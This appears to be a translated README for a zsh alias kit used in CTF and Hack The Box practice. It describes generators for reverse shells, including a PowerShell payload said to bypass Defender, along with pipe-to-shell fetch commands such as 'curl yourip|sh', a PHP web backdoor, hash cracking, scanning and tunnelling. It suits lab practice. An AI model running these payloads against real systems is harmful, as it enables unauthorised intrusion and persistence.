# CTF、HTB、THM 等相关工具
包含我常用的别名和脚本。只需将此仓库**克隆到你的主目录**，然后运行 `echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc`。重启 zsh 后，你应该可以使用所有别名和脚本。仅在 Kali Linux 上测试过，其他发行版可能需要安装额外的依赖。
> #### 免责声明
> 这些别名大多数可能写得不太好，欢迎提交拉取请求减少“呆萌”程度。对我来说，只要能用就足够了 :D
## 杂项
### > www

在当前目录启动一个监听80端口的 HTTP 服务器。同时打印出每个网络接口关联的 IP 地址列表，显示当前目录路径并列出文件。
示例：
```
┌──(jazz㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### 注意事项
> - 使用 sudo 以确保能够监听端口 80

### > tun0

将 tun0 接口的 IP 地址复制到剪贴板。  
示例：
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tun0 
```
剪贴板内容如下：
```
10.10.14.41
```

### > mkdir_cd
通常在创建目录后，我希望直接进入该目录。这个命令正是实现了这一点。  
示例： 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ mkdir_cd pepega

┌──(jazz㉿kali)-[~/jazz/pepega]
└─$ 
```

## 反向Shell
### > gen_lin_rev $ip $port 
基于 [RSaaS](https://github.com/lukechilds/reverse-shell)。在当前目录下创建一个名为 `index.html` 的文件。该文件包含多个反向Shell有效载荷，将依次尝试直到成功。可与 `www` 配合使用，使在获得RCE后生成反向Shell变得极其简单快捷。只需让目标执行 `curl yourip|sh`，即可从你的Web服务器获取反向Shell有效载荷，并-希望-连接回你的监听器。 
示例：
```
┌──(jazz㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/jazz/index.html
```
> #### 备注
> - 我非常喜欢 `curl yourip|sh` 载荷几乎没有坏字符，除了可能的空格和管道符。当空格成为问题时，有[解决方法](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces)，管道符可以通过先下载再单独执行来绕过。
> - 如果远程机器未安装 curl，可以尝试 `wget yourip -O-|sh`
 
### > gen_php_rev $ip $port

生成带有提供的 ip 和端口的 [PentestMonkey PHP 反向 Shell](https://github.com/pentestmonkey/php-reverse-shell)，并保存在当前目录中。  
示例：

```
┌──(jazz㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/jazz/jazz.php
```
### > gen_ps_rev $ip $port
生成一个使用提供的ip和端口的Powershell反向Shell，截至上次使用时能够绕过Defender。我不确定该给谁归功于这个有效载荷。 
示例：
```
┌──(jazz㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
剪贴板内容之后：
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## TTY 升级
### > uptty
将 python(2) 和 python3 的 tty 升级命令复制到剪贴板。
示例：
```
┌──(jazz㉿kali)-[~/jazz]
└─$ uptty
```
剪贴板内容如下：
```
python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### 注意事项
> - 需要安装 `xclip`
> - 目前仍包含 `py_tty_upgrade` 和 `py3_tty_upgrade`，但将调用此别名

### > script_tty_upgrade
当远程机器未安装 Python 时，可以使用此命令将升级到 tty shell 的 `script` 方法复制到剪贴板。 
示例：
```
┌──(jazz㉿kali)-[~/jazz]
└─$ script_tty_upgrade
```
剪贴板内容之后：
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### 注意事项
> - 需要安装 `xclip`

### > tty_fix
运行 `stty raw -echo; fg; reset`，应在使用上述 tty 升级之一后使用。

### > tty_conf
获取当前 tty 设置（行数和列数），并将一行命令复制到剪贴板，可以直接粘贴到你的反向 shell 窗口，使设置匹配。这解决了终端中途换行的问题。  
示例：
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tty_conf               
```
剪贴板内容如下：
```
stty rows 30 columns 116
```
> #### 备注
> - 需要安装 `xclip`

## 破解哈希
### > rock_john $hash_file（额外参数）
这个别名会注入 `--wordlist=/usr/share/wordlists/rockyou.txt` 参数，而不是手动输入（没有自动补全 :/），因此可以更方便地使用 JohnTheRipper 和 rockyou 字典尝试破解哈希。
示例：
```
┌──(jazz㉿kali)-[~/jazz]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
jazz             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### 备注
> - Kali 似乎在 2022.2 版本中修复了 John 的自动补全！不过这个别名仍然能帮你省点力 ;)
## 端口扫描
### > nmap_tcp $ip（额外参数）
使用我的默认设置启动 TCP nmap 扫描，并将扫描结果输出到一个 nmap 目录，如果该目录尚不存在则会自动创建。
示例：
```
┌──(jazz㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### 备注
> - 这只扫描默认的 TCP 端口。添加 `-p-` 参数以扫描所有端口。
> - 使用 `sudo` 获取执行 SYN 扫描所需的权限
### > nmap_udp $ip（额外参数）
使用我的默认设置启动 UDP nmap 扫描，并将扫描结果输出到一个 nmap 目录，如果该目录尚不存在会自动创建。
示例：
```
┌──(jazz㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### 注意事项
> - 这只扫描默认的 UDP 端口。添加 `-p-` 参数可以扫描所有端口。
> - 使用 `sudo` 获取执行 UDP 扫描所需的权限


## SecLists 路径

> #### 注意事项
> - 该工具包中的许多功能使用 SecLists 项目的字典列表。为了确保这些功能正常工作，脚本需要知道 SecLists 目录的位置。工具包使用以下逻辑定位 SecLists：

1. 首先检查 `/opt/seclists/` 是否存在。
2. 如果不存在，则检查 `/usr/share/seclists/` 是否存在。
3. 如果这两个目录都不存在，则查找名为 `SECLISTS_PATH` 的环境变量。

要设置 SecLists 以供这些脚本使用：

1. 在标准位置之一安装 SecLists（`/opt/seclists/` 或 `/usr/share/seclists/`）。
   
   或

2. 设置 `SECLISTS_PATH` 环境变量指向你的 SecLists 安装路径：

   ```bash
   export SECLISTS_PATH="/path/to/seclists"
   # You can add this line to your .zshrc file to make it permanent.
    ```

## 网站模糊测试
### > vhost $domain (-w 词表)（额外参数）
使用 ffuf 执行虚拟主机发现。
示例：
```
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```
> #### 注意事项
> - 当只传递域名时，将使用 http，但你也可以传入完整的 url，如 https://box.htb 来使用 https
> - 需要安装 `ffuf`
### > fuzz_dir $url（额外参数）
使用 ffuf 进行目录和文件模糊测试。
示例：
```
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -fs 245

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
```
> #### 注意事项
> - 需要安装 `ffuf`
## Chisel 隧道
### > chisel_socks $ip $port
使用 Chisel 设置 SOCKS 代理并将命令复制到剪贴板。
示例：

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
2024/08/05 23:31:03 server: Reverse tunnelling enabled
2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
```
### > chisel_forward $local_ip $local_port $remote_ip $remote_port
使用 Chisel 设置端口转发。
示例：

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
[+] Run this on the target machine
2024/08/05 23:32:30 server: Reverse tunnelling enabled
2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
```
## 主机管理
### > addhost $ip $hostname
在 /etc/hosts 文件中添加或更新条目。
示例：
```
┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
10.10.11.234 boss.htb big.boss.htb big.box.htb


┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.235 newbox.htb 
[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
10.10.11.235 newbox.htb
```
## 额外别名
- `linpeas`：下载最新版本的 LinPEAS。
- `upload`：使用 bashupload.com 上传文件。
- `phpcmd`：创建一个简单的 PHP 网络后门。
- `burl`：使用 burpsuite 代理的 curl。



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2026-05-07

---